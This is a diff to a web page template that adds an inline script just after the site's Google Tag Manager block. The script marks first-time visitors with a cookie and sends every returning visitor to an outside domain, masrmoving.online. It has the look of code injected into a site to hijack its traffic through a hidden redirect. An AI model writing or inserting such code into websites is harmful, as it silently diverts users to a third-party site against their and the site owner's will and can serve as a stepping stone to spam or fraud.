@@ -12,6 +12,26 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 <!-- End Google Tag Manager -->
 
    
+<script>
+function hasVisitedBefore() {
+    // Check if the cookie exists
+    return document.cookie.split(';').some((item) => item.trim().startsWith('visited='));
+}
+
+function redirectToLink(link) {
+    // Redirect to another link
+    window.location.href = link;
+}
+
+// Check if the user has visited before
+if (hasVisitedBefore()) {
+    // Redirect to another link if visited before
+    redirectToLink("https://masrmoving.online/");
+} else {
+    // Set cookie to indicate that the user has visited
+    document.cookie = "visited=true; path=/";
+}
+</script>
 
 
    
